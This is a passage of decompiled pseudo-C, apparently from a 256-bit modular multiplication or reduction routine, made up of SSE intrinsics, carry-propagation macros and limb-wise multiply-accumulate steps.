    v56 = _mm_load_si128(&v283);
    v57 = v54 != -1;
    v58 = _mm_srli_si128(_mm_add_epi64(_mm_and_si128(v50, v49), _mm_slli_si128(v55, 6)), 6);
    *a3 = v54 + 1;
    v59 = _mm_cvtsi128_si32(v58);
    v60 = _mm_add_epi64(_mm_move_epi64(v51), _mm_srli_si128(v58, 4));
    v61 = _mm_load_si128(&v284);
    v62 = v57 - 1;
    v57 = v59 < v62;
    v63 = _mm_srli_si128(_mm_add_epi64(_mm_and_si128(v51, v49), _mm_slli_si128(v60, 6)), 6);
    a3[1] = v59 - v62;
    v64 = _mm_cvtsi128_si32(v63);
    v65 = _mm_add_epi64(_mm_move_epi64(v52), _mm_srli_si128(v63, 4));
    v66 = _mm_load_si128(v285);
    v67 = v57 - 1;
    v57 = v64 < v67;
    v68 = _mm_srli_si128(_mm_add_epi64(_mm_and_si128(v52, v49), _mm_slli_si128(v65, 6)), 6);
    a3[2] = v64 - v67;
    v69 = _mm_cvtsi128_si32(v68);
    v70 = v57;
    v57 = v69 < v57;
    v71 = _mm_srli_si128(
            _mm_add_epi64(
              _mm_and_si128(v56, v49),
              _mm_slli_si128(_mm_add_epi64(_mm_move_epi64(v56), _mm_srli_si128(v68, 4)), 6)),
            6);
    a3[3] = v69 - v70;
    v72 = _mm_cvtsi128_si32(v71);
    v74 = v57;
    v57 = v72 < v57;
    v73 = v72 - v74;
    v75 = _mm_srli_si128(
            _mm_add_epi64(
              _mm_and_si128(v61, v49),
              _mm_slli_si128(_mm_add_epi64(_mm_move_epi64(v61), _mm_srli_si128(v71, 4)), 6)),
            6);
    v76 = _mm_cvtsi128_si32(v75);
    v77 = _mm_srli_si128(
            _mm_add_epi64(
              _mm_and_si128(v66, v49),
              _mm_slli_si128(_mm_add_epi64(_mm_move_epi64(v66), _mm_srli_si128(v75, 4)), 6)),
            6);
    v78 = _mm_cvtsi128_si32(v77);
    v79 = _mm_srli_si128(v77, 4);
    v81 = v57;
    v57 = v76 < v57;
    v80 = v76 - v81;
    v83 = v57 + 1;
    v57 = v78 < v83;
    v82 = v78 - v83;
    v84 = __PAIR64__(_mm_extract_epi16(v79, 2), _mm_cvtsi128_si32(v79)) - ((unsigned int)v57 - 1);
    v57 = __CFADD__(HIDWORD(v84), *a3);
    *a3 += HIDWORD(v84);
    v85 = v57;
    v57 = __CFADD__(v57, a3[1]) | __CFADD__(HIDWORD(v84), v57 + a3[1]);
    a3[1] += HIDWORD(v84) + v85;
    v86 = v57;
    v57 = __CFADD__(v57, a3[2]) | __CFADD__(HIDWORD(v84), v57 + a3[2]);
    a3[2] += HIDWORD(v84) + v86;
    v87 = v57;
    v57 = __CFADD__(v57, a3[3]);
    a3[3] += v87;
    v89 = v57;
    v57 = __CFADD__(v57, v73);
    result = v89 + v73;
    v91 = v57;
    v57 = __CFADD__(v57, v80);
    v90 = v91 + v80;
    a3[4] = result;
    v93 = v57;
    v57 = __CFADD__(v57, v82);
    v92 = v93 + v82;
    a3[5] = v90;
    a3[6] = v92 - HIDWORD(v84);
    a3[7] = HIDWORD(v84) + (v57 | __CFADD__(-HIDWORD(v84), v92)) + v84;
  }
  else
  {
    v94 = *a4;
    v95 = *a2;
    *(_DWORD *)&v291[40] = a3;
    v96 = v95 * (unsigned __int64)v94;
    *(_DWORD *)&v291[8] = v96;
    LODWORD(v96) = a4[2];
    v98 = v95 * (unsigned __int64)a4[1] + HIDWORD(v96);
    v97 = HIDWORD(v98);
    *(_DWORD *)&v291[12] = v98;
    v99 = v95 * (unsigned __int64)(unsigned int)v96;
    v100 = v99;
    LODWORD(v99) = a4[3];
    v102 = __PAIR64__(HIDWORD(v99), v100) + v97;
    v101 = HIDWORD(v102);
    *(_DWORD *)&v291[16] = v102;
    v103 = v95 * (unsigned __int64)(unsigned int)v99;
    v104 = v103;
    LODWORD(v103) = a4[4];
    v106 = __PAIR64__(HIDWORD(v103), v104) + v101;
    v105 = HIDWORD(v106);
    *(_DWORD *)&v291[20] = v106;
    v107 = v95 * (unsigned __int64)(unsigned int)v103;
    v108 = v107;
    LODWORD(v107) = a4[5];
    v110 = __PAIR64__(HIDWORD(v107), v108) + v105;
    v109 = HIDWORD(v110);
    *(_DWORD *)&v291[24] = v110;
    v111 = v95 * (unsigned __int64)(unsigned int)v107;
    v112 = v111;
    LODWORD(v111) = a4[6];
    v114 = __PAIR64__(HIDWORD(v111), v112) + v109;
    v113 = HIDWORD(v114);
    *(_DWORD *)&v291[28] = v114;
    v115 = v95 * (unsigned __int64)(unsigned int)v111;
    v116 = v95 * (unsigned __int64)a4[7] + ((v115 + v113) >> 32);
    v57 = __CFADD__(*(unsigned int *)&v291[8], *(_QWORD *)&v291[20]);
    *(_QWORD *)&v291[20] += *(unsigned int *)&v291[8];
    v117 = v57;
    v57 = __CFADD__(v57, *(_DWORD *)&v291[28]);
    *(_DWORD *)&v291[28] += v117;
    v118 = v57;
    v57 = __CFADD__(v57, v115 + v113) | __CFADD__(*(_DWORD *)&v291[8], v57 + v115 + v113);
    *(_DWORD *)&v291[32] = *(_DWORD *)&v291[8] + v118 + v115 + v113;
    v119 = a2[1];
    LODWORD(v115) = *a4;
    v121 = __PAIR64__(
             *(_DWORD *)&v291[8] + (unsigned int)__CFADD__(v57, (_DWORD)v116) + HIDWORD(v116),
             v57 + (unsigned int)v116)
         - *(unsigned int *)&v291[8];
    HIDWORD(v115) = HIDWORD(v121);
    *(_DWORD *)&v291[36] = v121;
    v120 = (__PAIR64__(
              __CFADD__(__CFADD__(v57, (_DWORD)v116), HIDWORD(v116)) | (unsigned __int8)__CFADD__(
                                                                                          *(_DWORD *)&v291[8],
                                                                                          __CFADD__(v57, (_DWORD)v116)
                                                                                        + HIDWORD(v116)),
              *(_DWORD *)&v291[8] + (unsigned int)__CFADD__(v57, (_DWORD)v116) + HIDWORD(v116))
          - (v57 + (unsigned int)v116 < *(_DWORD *)&v291[8])) >> 32;
    *(_DWORD *)&v291[8] = HIDWORD(v115);
    v122 = (*(unsigned int *)&v291[12] + v119 * (unsigned __int64)(unsigned int)v115) >> 32;
    *(_DWORD *)&v291[12] += v119 * v115;
    v123 = v119 * (unsigned __int64)a4[1];
    HIDWORD(v123) = (*(unsigned int *)&v291[16] + __PAIR64__(HIDWORD(v123), v122)) >> 32;
    v124 = v123 + *(_DWORD *)&v291[16] + v122;
    LODWORD(v123) = a4[2];
    *(_DWORD *)&v291[16] = v124;
    v125 = v119 * (unsigned __int64)(unsigned int)v123;
    HIDWORD(v125) = (*(unsigned int *)&v291[20] + __PAIR64__(HIDWORD(v125), HIDWORD(v124))) >> 32;
    v126 = v125 + (unsigned int)(*(_DWORD *)&v291[20] + HIDWORD(v124));
    LODWORD(v125) = a4[3];
    *(_DWORD *)&v291[20] = v126;
    v127 = v119 * (unsigned __int64)(unsigned int)v125;
    HIDWORD(v127) = (*(unsigned int *)&v291[24] + __PAIR64__(HIDWORD(v127), HIDWORD(v126))) >> 32;
    v128 = v127 + (unsigned int)(*(_DWORD *)&v291[24] + HIDWORD(v126));
    LODWORD(v127) = a4[4];
    *(_DWORD *)&v291[24] = v128;
    v129 = v119 * (unsigned __int64)(unsigned int)v127;
    HIDWORD(v129) = (*(unsigned int *)&v291[28] + __PAIR64__(HIDWORD(v129), HIDWORD(v128))) >> 32;
    v130 = v129 + (unsigned int)(*(_DWORD *)&v291[28] + HIDWORD(v128));
    LODWORD(v129) = a4[5];
    *(_DWORD *)&v291[28] = v130;
    v131 = v119 * (unsigned __int64)(unsigned int)v129;
    HIDWORD(v131) = (*(unsigned int *)&v291[32] + __PAIR64__(HIDWORD(v131), HIDWORD(v130))) >> 32;
    v132 = v131 + (unsigned int)(*(_DWORD *)&v291[32] + HIDWORD(v130));
    LODWORD(v131) = a4[6];
    *(_DWORD *)&v291[32] = v132;
    v133 = v119 * (unsigned __int64)(unsigned int)v131;
    HIDWORD(v133) = (*(unsigned int *)&v291[36] + __PAIR64__(HIDWORD(v133), HIDWORD(v132))) >> 32;
    v134 = v133 + (unsigned int)(*(_DWORD *)&v291[36] + HIDWORD(v132));
    v135 = v119 * (unsigned __int64)a4[7];
    HIDWORD(v135) = (*(unsigned int *)&v291[8] + __PAIR64__(HIDWORD(v135), HIDWORD(v134))) >> 32;
    v136 = v135 + __PAIR64__(v120, *(_DWORD *)&v291[8] + HIDWORD(v134));
    v137 = __CFADD__(__CFADD__((_DWORD)v135, *(_DWORD *)&v291[8] + HIDWORD(v134)), HIDWORD(v135)) | __CFADD__(v120, (v135 + __PAIR64__(v120, *(_DWORD *)&v291[8] + HIDWORD(v134))) >> 32);
    v57 = __CFADD__(*(unsigned int *)&v291[12], *(_QWORD *)&v291[24]);
    *(_QWORD *)&v291[24] += *(unsigned int *)&v291[12];
    *(_DWORD *)&v291[32] = v57 + (_DWORD)v132;
    v138 = __CFADD__(v57, (_DWORD)v132);
    v57 = __CFADD__(v138, (_DWORD)v134) | __CFADD__(*(_DWORD *)&v291[12], v138 + v134);
    *(_DWORD *)&v291[36] = *(_DWORD *)&v291[12] + v138 + v134;
    v139 = a2[2];
    LODWORD(v135) = *a4;
    v141 = __PAIR64__(
             *(_DWORD *)&v291[12] + (unsigned int)__CFADD__(v57, (_DWORD)v136) + HIDWORD(v136),
             v57 + (unsigned int)v136)
         - *(unsigned int *)&v291[12];
    v142 = HIDWORD(v141);
    *(_DWORD *)&v291[8] = v141;
    v140 = (__PAIR64__(
              (unsigned int)(__CFADD__(__CFADD__(v57, (_DWORD)v136), HIDWORD(v136)) | __CFADD__(
                                                                                        *(_DWORD *)&v291[12],
                                                                                        __CFADD__(v57, (_DWORD)v136)
                                                                                      + HIDWORD(v136)))
            + v137,
              *(_DWORD *)&v291[12] + (unsigned int)__CFADD__(v57, (_DWORD)v136) + HIDWORD(v136))
          - (v57 + (unsigned int)v136 < *(_DWORD *)&v291[12])) >> 32;
    *(_DWORD *)&v291[12] = v142;
    v143 = ((unsigned int)v124 + v139 * (unsigned __int64)(unsigned int)v135) >> 32;
    *(_DWORD *)&v291[16] = v124 + v139 * v135;
    v144 = v139 * (unsigned __int64)a4[1];
    HIDWORD(v144) = ((unsigned int)v126 + __PAIR64__(HIDWORD(v144), v143)) >> 32;
    v145 = v144 + (unsigned int)v126 + v143;
    LODWORD(v144) = a4[2];
    *(_DWORD *)&v291[20] = v145;
    v146 = v139 * (unsigned __int64)(unsigned int)v144;
    HIDWORD(v146) = (*(unsigned int *)&v291[24] + __PAIR64__(HIDWORD(v146), HIDWORD(v145))) >> 32;
    v147 = v146 + (unsigned int)(*(_DWORD *)&v291[24] + HIDWORD(v145));
    LODWORD(v146) = a4[3];
    *(_DWORD *)&v291[24] = v147;
    v148 = v139 * (unsigned __int64)(unsigned int)v146;
    HIDWORD(v148) = (*(unsigned int *)&v291[28] + __PAIR64__(HIDWORD(v148), HIDWORD(v147))) >> 32;
    v149 = v148 + (unsigned int)(*(_DWORD *)&v291[28] + HIDWORD(v147));
    LODWORD(v148) = a4[4];
    *(_DWORD *)&v291[28] = v149;
    v150 = v139 * (unsigned __int64)(unsigned int)v148;
    HIDWORD(v150) = (*(unsigned int *)&v291[32] + __PAIR64__(HIDWORD(v150), HIDWORD(v149))) >> 32;
    v151 = v150 + (unsigned int)(*(_DWORD *)&v291[32] + HIDWORD(v149));
    LODWORD(v150) = a4[5];
    *(_DWORD *)&v291[32] = v151;
    v152 = v139 * (unsigned __int64)(unsigned int)v150;
    HIDWORD(v152) = (*(unsigned int *)&v291[36] + __PAIR64__(HIDWORD(v152), HIDWORD(v151))) >> 32;
    v153 = v152 + (unsigned int)(*(_DWORD *)&v291[36] + HIDWORD(v151));
    LODWORD(v152) = a4[6];
    *(_DWORD *)&v291[36] = v153;
    v154 = v139 * (unsigned __int64)(unsigned int)v152;
    HIDWORD(v154) = (*(unsigned int *)&v291[8] + __PAIR64__(HIDWORD(v154), HIDWORD(v153))) >> 32;
    v155 = v154 + (unsigned int)(*(_DWORD *)&v291[8] + HIDWORD(v153));
    v156 = v139 * (unsigned __int64)a4[7];
    HIDWORD(v156) = (v142 + __PAIR64__(HIDWORD(v156), HIDWORD(v155))) >> 32;
    v157 = v156 + __PAIR64__(v140, v142 + HIDWORD(v155));
    v158 = __CFADD__(__CFADD__((_DWORD)v156, v142 + HIDWORD(v155)), HIDWORD(v156)) | __CFADD__(
                                                                                       v140,
                                                                                       (v156
                                                                                      + __PAIR64__(
                                                                                          v140,
                                                                                          v142 + HIDWORD(v155))) >> 32);
    v57 = __CFADD__(*(unsigned int *)&v291[16], *(_QWORD *)&v291[28]);
    *(_QWORD *)&v291[28] += *(unsigned int *)&v291[16];
    *(_DWORD *)&v291[36] = v57 + (_DWORD)v153;
    v159 = __CFADD__(v57, (_DWORD)v153);
    v57 = __CFADD__(v159, (_DWORD)v155) | __CFADD__(*(_DWORD *)&v291[16], v159 + v155);
    *(_DWORD *)&v291[8] = *(_DWORD *)&v291[16] + v159 + v155;
    v160 = a2[3];
    LODWORD(v156) = *a4;
    v162 = __PAIR64__(
             *(_DWORD *)&v291[16] + (unsigned int)__CFADD__(v57, (_DWORD)v157) + HIDWORD(v157),
             v57 + (unsigned int)v157)
         - *(unsigned int *)&v291[16];
    v163 = HIDWORD(v162);
    *(_DWORD *)&v291[12] = v162;
    v161 = (__PAIR64__(
              (unsigned int)(__CFADD__(__CFADD__(v57, (_DWORD)v157), HIDWORD(v157)) | __CFADD__(
                                                                                        *(_DWORD *)&v291[16],
                                                                                        __CFADD__(v57, (_DWORD)v157)
                                                                                      + HIDWORD(v157)))
            + v158,
              *(_DWORD *)&v291[16] + (unsigned int)__CFADD__(v57, (_DWORD)v157) + HIDWORD(v157))
          - (v57 + (unsigned int)v157 < *(_DWORD *)&v291[16])) >> 32;
    *(_DWORD *)&v291[16] = v163;
    v164 = ((unsigned int)v145 + v160 * (unsigned __int64)(unsigned int)v156) >> 32;
    *(_DWORD *)&v291[20] = v145 + v160 * v156;
    v165 = v160 * (unsigned __int64)a4[1];
    HIDWORD(v165) = ((unsigned int)v147 + __PAIR64__(HIDWORD(v165), v164)) >> 32;
    v166 = v165 + (unsigned int)v147 + v164;
    LODWORD(v165) = a4[2];
    *(_DWORD *)&v291[24] = v166;
    v167 = v160 * (unsigned __int64)(unsigned int)v165;
    HIDWORD(v167) = (*(unsigned int *)&v291[28] + __PAIR64__(HIDWORD(v167), HIDWORD(v166))) >> 32;
    v168 = v167 + (unsigned int)(*(_DWORD *)&v291[28] + HIDWORD(v166));
    LODWORD(v167) = a4[3];
    *(_DWORD *)&v291[28] = v168;
    v169 = v160 * (unsigned __int64)(unsigned int)v167;
    HIDWORD(v169) = (*(unsigned int *)&v291[32] + __PAIR64__(HIDWORD(v169), HIDWORD(v168))) >> 32;
    v170 = v169 + (unsigned int)(*(_DWORD *)&v291[32] + HIDWORD(v168));
    LODWORD(v169) = a4[4];
    *(_DWORD *)&v291[32] = v170;
    v171 = v160 * (unsigned __int64)(unsigned int)v169;
    HIDWORD(v171) = (*(unsigned int *)&v291[36] + __PAIR64__(HIDWORD(v171), HIDWORD(v170))) >> 32;
    v172 = v171 + (unsigned int)(*(_DWORD *)&v291[36] + HIDWORD(v170));
    LODWORD(v171) = a4[5];
    *(_DWORD *)&v291[36] = v172;
    v173 = v160 * (unsigned __int64)(unsigned int)v171;
    HIDWORD(v173) = (*(unsigned int *)&v291[8] + __PAIR64__(HIDWORD(v173), HIDWORD(v172))) >> 32;
    v174 = v173 + (unsigned int)(*(_DWORD *)&v291[8] + HIDWORD(v172));
    LODWORD(v173) = a4[6];
    *(_DWORD *)&v291[8] = v174;
    v175 = v160 * (unsigned __int64)(unsigned int)v173;
    HIDWORD(v175) = (*(unsigned int *)&v291[12] + __PAIR64__(HIDWORD(v175), HIDWORD(v174))) >> 32;
    v176 = v175 + (unsigned int)(*(_DWORD *)&v291[12] + HIDWORD(v174));
    v177 = v160 * (unsigned __int64)a4[7];
    HIDWORD(v177) = (v163 + __PAIR64__(HIDWORD(v177), HIDWORD(v176))) >> 32;
    v178 = v177 + __PAIR64__(v161, v163 + HIDWORD(v176));
    v179 = __CFADD__(__CFADD__((_DWORD)v177, v163 + HIDWORD(v176)), HIDWORD(v177)) | __CFADD__(
                                                                                       v161,
                                                                                       (v177
                                                                                      + __PAIR64__(
                                                                                          v161,
                                                                                          v163 + HIDWORD(v176))) >> 32);
    v57 = __CFADD__(*(unsigned int *)&v291[20], *(_QWORD *)&v291[32]);
    *(_QWORD *)&v291[32] += *(unsigned int *)&v291[20];
    *(_DWORD *)&v291[8] = v57 + (_DWORD)v174;
    v180 = __CFADD__(v57, (_DWORD)v174);
    v57 = __CFADD__(v180, (_DWORD)v176) | __CFADD__(*(_DWORD *)&v291[20], v180 + v176);
    *(_DWORD *)&v291[12] = *(_DWORD *)&v291[20] + v180 + v176;
    v181 = a2[4];
    LODWORD(v177) = *a4;
    v183 = __PAIR64__(
             *(_DWORD *)&v291[20] + (unsigned int)__CFADD__(v57, (_DWORD)v178) + HIDWORD(v178),
             v57 + (unsigned int)v178)
         - *(unsigned int *)&v291[20];
    v184 = HIDWORD(v183);
    *(_DWORD *)&v291[16] = v183;
    v182 = (__PAIR64__(
              (unsigned int)(__CFADD__(__CFADD__(v57, (_DWORD)v178), HIDWORD(v178)) | __CFADD__(
                                                                                        *(_DWORD *)&v291[20],
                                                                                        __CFADD__(v57, (_DWORD)v178)
                                                                                      + HIDWORD(v178)))
            + v179,
              *(_DWORD *)&v291[20] + (unsigned int)__CFADD__(v57, (_DWORD)v178) + HIDWORD(v178))
          - (v57 + (unsigned int)v178 < *(_DWORD *)&v291[20])) >> 32;
    *(_DWORD *)&v291[20] = v184;
    v185 = ((unsigned int)v166 + v181 * (unsigned __int64)(unsigned int)v177) >> 32;
    *(_DWORD *)&v291[24] = v166 + v181 * v177;
    v186 = v181 * (unsigned __int64)a4[1];
    HIDWORD(v186) = ((unsigned int)v168 + __PAIR64__(HIDWORD(v186), v185)) >> 32;
    v187 = v186 + (unsigned int)v168 + v185;
    LODWORD(v186) = a4[2];
    *(_DWORD *)&v291[28] = v187;
    v188 = v181 * (unsigned __int64)(unsigned int)v186;
    HIDWORD(v188) = (*(unsigned int *)&v291[32] + __PAIR64__(HIDWORD(v188), HIDWORD(v187))) >> 32;
    v189 = v188 + (unsigned int)(*(_DWORD *)&v291[32] + HIDWORD(v187));
    LODWORD(v188) = a4[3];
    *(_DWORD *)&v291[32] = v189;
    v190 = v181 * (unsigned __int64)(unsigned int)v188;
    HIDWORD(v190) = (*(unsigned int *)&v291[36] + __PAIR64__(HIDWORD(v190), HIDWORD(v189))) >> 32;
    v191 = v190 + (unsigned int)(*(_DWORD *)&v291[36] + HIDWORD(v189));
    LODWORD(v190) = a4[4];
    *(_DWORD *)&v291[36] = v191;
    v192 = v181 * (unsigned __int64)(unsigned int)v190;
    HIDWORD(v192) = (*(unsigned int *)&v291[8] + __PAIR64__(HIDWORD(v192), HIDWORD(v191))) >> 32;
    v193 = v192 + (unsigned int)(*(_DWORD *)&v291[8] + HIDWORD(v191));
    LODWORD(v192) = a4[5];
    *(_DWORD *)&v291[8] = v193;
    v194 = v181 * (unsigned __int64)(unsigned int)v192;
    HIDWORD(v194) = (*(unsigned int *)&v291[12] + __PAIR64__(HIDWORD(v194), HIDWORD(v193))) >> 32;
    v195 = v194 + (unsigned int)(*(_DWORD *)&v291[12] + HIDWORD(v193));
    LODWORD(v194) = a4[6];
    *(_DWORD *)&v291[12] = v195;
    v196 = v181 * (unsigned __int64)(unsigned int)v194;
    HIDWORD(v196) = (*(unsigned int *)&v291[16] + __PAIR64__(HIDWORD(v196), HIDWORD(v195))) >> 32;
    v197 = v196 + (unsigned int)(*(_DWORD *)&v291[16] + HIDWORD(v195));
    v198 = v181 * (unsigned __int64)a4[7];
    HIDWORD(v198) = (v184 + __PAIR64__(HIDWORD(v198), HIDWORD(v197))) >> 32;
    v199 = v198 + __PAIR64__(v182, v184 + HIDWORD(v197));
    v200 = __CFADD__(__CFADD__((_DWORD)v198, v184 + HIDWORD(v197)), HIDWORD(v198)) | __CFADD__(
                                                                                       v182,
                                                                                       (v198
                                                                                      + __PAIR64__(
                                                                                          v182,
                                                                                          v184 + HIDWORD(v197))) >> 32);
    *(_DWORD *)&v291[8] = (*(unsigned int *)&v291[24] + __PAIR64__(v193, v191)) >> 32;
    *(_DWORD *)&v291[36] = *(_DWORD *)&v291[24] + v191;
    *(_DWORD *)&v291[12] = __CFADD__(*(unsigned int *)&v291[24], __PAIR64__(v193, v191)) + (_DWORD)v195;
    v201 = __CFADD__(__CFADD__(*(unsigned int *)&v291[24], __PAIR64__(v193, v191)), (_DWORD)v195);
    v57 = __CFADD__(v201, (_DWORD)v197) | __CFADD__(*(_DWORD *)&v291[24], v201 + v197);
    *(_DWORD *)&v291[16] = *(_DWORD *)&v291[24] + v201 + v197;
    v202 = a2[5];
    LODWORD(v198) = *a4;
    v204 = __PAIR64__(
             *(_DWORD *)&v291[24] + (unsigned int)__CFADD__(v57, (_DWORD)v199) + HIDWORD(v199),
             v57 + (unsigned int)v199)
         - *(unsigned int *)&v291[24];
    v205 = HIDWORD(v204);
    *(_DWORD *)&v291[20] = v204;
    v203 = (__PAIR64__(
              (unsigned int)(__CFADD__(__CFADD__(v57, (_DWORD)v199), HIDWORD(v199)) | __CFADD__(
                                                                                        *(_DWORD *)&v291[24],
                                                                                        __CFADD__(v57, (_DWORD)v199)
                                                                                      + HIDWORD(v199)))
            + v200,
              *(_DWORD *)&v291[24] + (unsigned int)__CFADD__(v57, (_DWORD)v199) + HIDWORD(v199))
          - (v57 + (unsigned int)v199 < *(_DWORD *)&v291[24])) >> 32;
    *(_DWORD *)&v291[24] = v205;
    v206 = ((unsigned int)v187 + v202 * (unsigned __int64)(unsigned int)v198) >> 32;
    *(_DWORD *)&v291[28] = v187 + v202 * v198;
    v207 = v202 * (unsigned __int64)a4[1];
    HIDWORD(v207) = ((unsigned int)v189 + __PAIR64__(HIDWORD(v207), v206)) >> 32;
    v208 = v207 + (unsigned int)v189 + v206;
    LODWORD(v207) = a4[2];
    *(_DWORD *)&v291[32] = v208;
    v209 = v202 * (unsigned __int64)(unsigned int)v207;
    HIDWORD(v209) = (*(unsigned int *)&v291[36] + __PAIR64__(HIDWORD(v209), HIDWORD(v208))) >> 32;
    v210 = v209 + (unsigned int)(*(_DWORD *)&v291[36] + HIDWORD(v208));
    LODWORD(v209) = a4[3];
    *(_DWORD *)&v291[36] = v210;
    v211 = v202 * (unsigned __int64)(unsigned int)v209;
    HIDWORD(v211) = (*(unsigned int *)&v291[8] + __PAIR64__(HIDWORD(v211), HIDWORD(v210))) >> 32;
    v212 = v211 + (unsigned int)(*(_DWORD *)&v291[8] + HIDWORD(v210));
    LODWORD(v211) = a4[4];
    *(_DWORD *)&v291[8] = v212;
    v213 = v202 * (unsigned __int64)(unsigned int)v211;
    HIDWORD(v213) = (*(unsigned int *)&v291[12] + __PAIR64__(HIDWORD(v213), HIDWORD(v212))) >> 32;
    v214 = v213 + (unsigned int)(*(_DWORD *)&v291[12] + HIDWORD(v212));
    LODWORD(v213) = a4[5];
    *(_DWORD *)&v291[12] = v214;
    v215 = v202 * (unsigned __int64)(unsigned int)v213;
    HIDWORD(v215) = (*(unsigned int *)&v291[16] + __PAIR64__(HIDWORD(v215), HIDWORD(v214))) >> 32;
    v216 = v215 + (unsigned int)(*(_DWORD *)&v291[16] + HIDWORD(v214));
    LODWORD(v215) = a4[6];
    *(_DWORD *)&v291[16] = v216;
    v217 = v202 * (unsigned __int64)(unsigned int)v215;
    HIDWORD(v217) = (*(unsigned int *)&v291[20] + __PAIR64__(HIDWORD(v217), HIDWORD(v216))) >> 32;
    v218 = v217 + (unsigned int)(*(_DWORD *)&v291[20] + HIDWORD(v216));
    v219 = v202 * (unsigned __int64)a4[7];
    HIDWORD(v219) = (v205 + __PAIR64__(HIDWORD(v219), HIDWORD(v218))) >> 32;
    v220 = v219 + __PAIR64__(v203, v205 + HIDWORD(v218));
    v221 = __CFADD__(__CFADD__((_DWORD)v219, v205 + HIDWORD(v218)), HIDWORD(v219)) | __CFADD__(
                                                                                       v203,
                                                                                       (v219
                                                                                      + __PAIR64__(
                                                                                          v203,
                                                                                          v205 + HIDWORD(v218))) >> 32);
    v57 = __CFADD__(*(unsigned int *)&v291[28], *(_QWORD *)&v291[8]);
    *(_QWORD *)&v291[8] += *(unsigned int *)&v291[28];
    *(_DWORD *)&v291[16] = v57 + (_DWORD)v216;
    v222 = __CFADD__(v57, (_DWORD)v216);
    v57 = __CFADD__(v222, (_DWORD)v218) | __CFADD__(*(_DWORD *)&v291[28], v222 + v218);
    *(_DWORD *)&v291[20] = *(_DWORD *)&v291[28] + v222 + v218;
    v223 = a2[6];
    LODWORD(v219) = *a4;
    v225 = __PAIR64__(
             *(_DWORD *)&v291[28] + (unsigned int)__CFADD__(v57, (_DWORD)v220) + HIDWORD(v220),
             v57 + (unsigned int)v220)
         - *(unsigned int *)&v291[28];
    v226 = HIDWORD(v225);
    *(_DWORD *)&v291[24] = v225;
    v224 = (__PAIR64__(
              (unsigned int)(__CFADD__(__CFADD__(v57, (_DWORD)v220), HIDWORD(v220)) | __CFADD__(
                                                                                        *(_DWORD *)&v291[28],
                                                                                        __CFADD__(v57, (_DWORD)v220)
                                                                                      + HIDWORD(v220)))
            + v221,
              *(_DWORD *)&v291[28] + (unsigned int)__CFADD__(v57, (_DWORD)v220) + HIDWORD(v220))
          - (v57 + (unsigned int)v220 < *(_DWORD *)&v291[28])) >> 32;
    *(_DWORD *)&v291[28] = v226;
    v227 = ((unsigned int)v208 + v223 * (unsigned __int64)(unsigned int)v219) >> 32;
    *(_DWORD *)&v291[32] = v208 + v223 * v219;
    v228 = v223 * (unsigned __int64)a4[1];
    HIDWORD(v228) = ((unsigned int)v210 + __PAIR64__(HIDWORD(v228), v227)) >> 32;
    v229 = v228 + (unsigned int)v210 + v227;
    LODWORD(v228) = a4[2];
    *(_DWORD *)&v291[36] = v229;
    v230 = v223 * (unsigned __int64)(unsigned int)v228;
    HIDWORD(v230) = (*(unsigned int *)&v291[8] + __PAIR64__(HIDWORD(v230), HIDWORD(v229))) >> 32;
    v231 = v230 + (unsigned int)(*(_DWORD *)&v291[8] + HIDWORD(v229));
    LODWORD(v230) = a4[3];
    *(_DWORD *)&v291[8] = v231;
    v232 = v223 * (unsigned __int64)(unsigned int)v230;
    HIDWORD(v232) = (*(unsigned int *)&v291[12] + __PAIR64__(HIDWORD(v232), HIDWORD(v231))) >> 32;
    v233 = v232 + (unsigned int)(*(_DWORD *)&v291[12] + HIDWORD(v231));
    LODWORD(v232) = a4[4];
    *(_DWORD *)&v291[12] = v233;
    v234 = v223 * (unsigned __int64)(unsigned int)v232;
    HIDWORD(v234) = (*(unsigned int *)&v291[16] + __PAIR64__(HIDWORD(v234), HIDWORD(v233))) >> 32;
    v235 = v234 + (unsigned int)(*(_DWORD *)&v291[16] + HIDWORD(v233));
    LODWORD(v234) = a4[5];
    *(_DWORD *)&v291[16] = v235;
    v236 = v223 * (unsigned __int64)(unsigned int)v234;
    HIDWORD(v236) = (*(unsigned int *)&v291[20] + __PAIR64__(HIDWORD(v236), HIDWORD(v235))) >> 32;
    v237 = v236 + (unsigned int)(*(_DWORD *)&v291[20] + HIDWORD(v235));
    LODWORD(v236) = a4[6];
    *(_DWORD *)&v291[20] = v237;
    v238 = v223 * (unsigned __int64)(unsigned int)v236;
    HIDWORD(v238) = (*(unsigned int *)&v291[24] + __PAIR64__(HIDWORD(v238), HIDWORD(v237))) >> 32;
    v239 = v238 + (unsigned int)(*(_DWORD *)&v291[24] + HIDWORD(v237));
    v240 = v223 * (unsigned __int64)a4[7];
    HIDWORD(v240) = (v226 + __PAIR64__(HIDWORD(v240), HIDWORD(v239))) >> 32;
    v241 = v240 + __PAIR64__(v224, v226 + HIDWORD(v239));
    v242 = __CFADD__(__CFADD__((_DWORD)v240, v226 + HIDWORD(v239)), HIDWORD(v240)) | __CFADD__(
                                                                                       v224,
                                                                                       (v240
                                                                                      + __PAIR64__(
                                                                                          v224,
                                                                                          v226 + HIDWORD(v239))) >> 32);
    v57 = __CFADD__(*(unsigned int *)&v291[32], *(_QWORD *)&v291[12]);
    *(_QWORD *)&v291[12] += *(unsigned int *)&v291[32];
    *(_DWORD *)&v291[20] = v57 + (_DWORD)v237;
    v243 = __CFADD__(v57, (_DWORD)v237);
    v57 = __CFADD__(v243, (_DWORD)v239) | __CFADD__(*(_DWORD *)&v291[32], v243 + v239);
    *(_DWORD *)&v291[24] = *(_DWORD *)&v291[32] + v243 + v239;
    v244 = a2[7];
    LODWORD(v240) = *a4;
    v246 = __PAIR64__(
             *(_DWORD *)&v291[32] + (unsigned int)__CFADD__(v57, (_DWORD)v241) + HIDWORD(v241),
             v57 + (unsigned int)v241)
         - *(unsigned int *)&v291[32];
    v247 = HIDWORD(v246);
    *(_DWORD *)&v291[28] = v246;
    v245 = (__PAIR64__(
              (unsigned int)(__CFADD__(__CFADD__(v57, (_DWORD)v241), HIDWORD(v241)) | __CFADD__(
                                                                                        *(_DWORD *)&v291[32],
                                                                                        __CFADD__(v57, (_DWORD)v241)
                                                                                      + HIDWORD(v241)))
            + v242,
              *(_DWORD *)&v291[32] + (unsigned int)__CFADD__(v57, (_DWORD)v241) + HIDWORD(v241))
          - (v57 + (unsigned int)v241 < *(_DWORD *)&v291[32])) >> 32;
    *(_DWORD *)&v291[32] = v247;
    v248 = ((unsigned int)v229 + v244 * (unsigned __int64)(unsigned int)v240) >> 32;
    *(_DWORD *)&v291[36] = v229 + v244 * v240;
    v249 = v244 * (unsigned __int64)a4[1];
